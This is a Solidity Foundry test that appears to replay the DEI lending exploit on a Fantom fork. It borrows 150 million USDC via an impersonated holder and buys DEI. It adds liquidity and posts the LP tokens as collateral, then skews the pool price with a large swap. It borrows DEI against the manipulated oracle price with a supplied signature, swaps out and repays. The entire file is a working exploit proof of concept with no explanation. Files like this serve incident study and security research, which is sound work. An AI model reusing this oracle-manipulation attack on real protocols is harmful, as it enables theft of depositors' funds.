// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

contract ContractTest is Test {
    CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    IBaseV1Router01 router = IBaseV1Router01(0xa38cd27185a464914D3046f0AB9d43356B34829D);

    IDeiLenderSolidex DeiLenderSolidex = IDeiLenderSolidex(0x8D643d954798392403eeA19dB8108f595bB8B730);

    IUSDC usdc = IUSDC(0x04068DA6C83AFCFA0e13ba15A6696662335D5B75);

    IERC20 dei = IERC20(0xDE12c7959E1a72bbe8a5f7A1dc8f8EeF9Ab011B3);

    ISSPv4 sspv4 = ISSPv4(0xbe9dE5747317F27f9A39ea5924ed4c51b34fB0d1);

    IERC20 lpToken = IERC20(0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0);

    IERC20 DepositToken = IERC20(0xD82001B651F7fb67Db99C679133F384244e20E79);

    address owner_of_usdc = 0xC564EE9f21Ed8A2d8E7e76c085740d5e4c5FaFbE;

    ILpDepositor LpDepositor = ILpDepositor(0x26E1A0d851CF28E697870e1b7F053B605C8b060F);

    IOracle oracle = IOracle(0x8129026c585bCfA530445a6267f9389057761A00);

    function setUp() public {
        cheat.createSelectFork("fantom", 37_093_708); // fork fantom at block 37093708
    }

    function testExample() public {
        cheat.prank(owner_of_usdc);

        usdc.Swapin(
            0x33e48143c6ea17476eeabfa202d8034190ea3f2280b643e2570c54265fe33c98, address(this), 150_000_000 * 10 ** 6
        );

        uint256 balance_of_usdc = usdc.balanceOf(address(this));

        emit log_named_uint("The USDC I have now", balance_of_usdc);

        usdc.approve(address(sspv4), type(uint256).max);

        sspv4.buyDei(1_000_000 * 10 ** 6);

        uint256 balance_of_dei = dei.balanceOf(address(this));

        emit log_named_uint("The DEI after buying DEI", balance_of_dei);

        balance_of_usdc = usdc.balanceOf(address(this));

        emit log_named_uint("The USDC after buying DEI", balance_of_usdc);

        usdc.approve(address(router), type(uint256).max);

        dei.approve(address(router), type(uint256).max);

        router.addLiquidity(
            address(dei),
            address(usdc),
            true,
            894_048_109_294_000_000_000_000,
            965_495_000_000,
            876_167_147_108_120_000_000_000,
            946_185_100_000,
            address(this),
            block.timestamp
        );

        uint256 balance_of_LpToken = lpToken.balanceOf(address(this));

        emit log_named_uint("The LPToken After adding Liquidity", balance_of_LpToken);

        lpToken.approve(address(LpDepositor), type(uint256).max);

        LpDepositor.deposit(address(lpToken), balance_of_LpToken);

        balance_of_LpToken = lpToken.balanceOf(address(this));

        uint256 balance_of_DepositToken = DepositToken.balanceOf(address(this));

        emit log_named_uint("The DepositToken After depositting LPtoken", balance_of_DepositToken);

        DepositToken.approve(address(DeiLenderSolidex), type(uint256).max);

        DeiLenderSolidex.addCollateral(address(this), balance_of_DepositToken);

        balance_of_DepositToken = DepositToken.balanceOf(address(this));

        emit log_named_uint("The DepositToken After addCollateral", balance_of_DepositToken);

        balance_of_usdc = usdc.balanceOf(address(this));

        emit log_named_uint("The USDC I have now", balance_of_usdc);

        usdc.approve(address(router), type(uint256).max);

        router.swapExactTokensForTokensSimple(
            143_200_000_000_000, 0, address(usdc), address(dei), true, address(this), block.timestamp
        );

        balance_of_dei = dei.balanceOf(address(this));

        emit log_named_uint("The DEI I have after swapping", balance_of_dei);

        SchnorrSign memory sig = SchnorrSign(
            1_835_036_472_718_200_664_753_898_924_933_875_196_349_373_787_186_253_604_571_797_551_094_739_683_650,
            0xF096EC73cB49B024f1D93eFe893E38337E7a099a,
            0xD58D8931b98942EE19C431B72f4Bc8B3eD28d8DF
        );

        SchnorrSign[] memory sigs = new SchnorrSign[](1);

        sigs[0] = sig;

        bytes memory repID = "0x01701220183a8e97b39ebe3c38b6166cd7c9ddfe3c38fd76352e5652b9c25467aa47b040";

        uint256 price = oracle.getOnChainPrice();

        emit log_named_uint("The price from Oracle", price);

        cheat.warp(1_651_113_560);

        emit log_named_uint("the time now", block.timestamp);

        DeiLenderSolidex.borrow(
            address(this),
            17_246_885_701_212_305_622_476_302,
            20_923_953_265_992_870_251_804_289,
            1_651_113_560,
            repID,
            sigs
        );

        balance_of_dei = dei.balanceOf(address(this));

        emit log_named_uint("The DEI after borrowing", balance_of_dei);

        router.swapExactTokensForTokensSimple(
            12_000_000_000_000_000_000_000_000, 0, address(dei), address(usdc), true, address(this), block.timestamp
        );

        usdc.transfer(owner_of_usdc, 150_000_000 * 10 ** 6);

        balance_of_dei = dei.balanceOf(address(this));

        balance_of_usdc = usdc.balanceOf(address(this));

        emit log_named_uint("The USDC after paying back", balance_of_usdc);

        emit log_named_uint("The DEI after paying back", balance_of_dei);
    }
}
